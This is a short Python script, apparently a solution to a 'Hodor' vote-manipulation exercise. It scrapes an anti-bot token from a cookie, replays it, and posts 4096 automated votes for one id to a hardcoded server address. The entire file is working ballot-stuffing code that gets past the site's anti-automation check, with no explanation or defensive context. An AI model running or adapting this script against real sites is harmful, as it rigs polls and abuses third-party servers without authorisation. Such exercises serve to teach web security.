#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
Created on Thu May 28 07:10:33 2020

@author: meco
"""
import requests


cookies = {'HoldTheDoor': '0'}

url = 'http://158.69.76.135/level1.php'
playload = {'id': '1574', 'holdthedoor': 'submit', 'key': '0'}

req = requests.get(url)
for i in range(4096):
    cookies['holdthedoor'] = req.cookies['HoldTheDoor']
    req = requests.post(url, data=playload, cookies=cookies)
print('Well done, Voting complete for level 1')
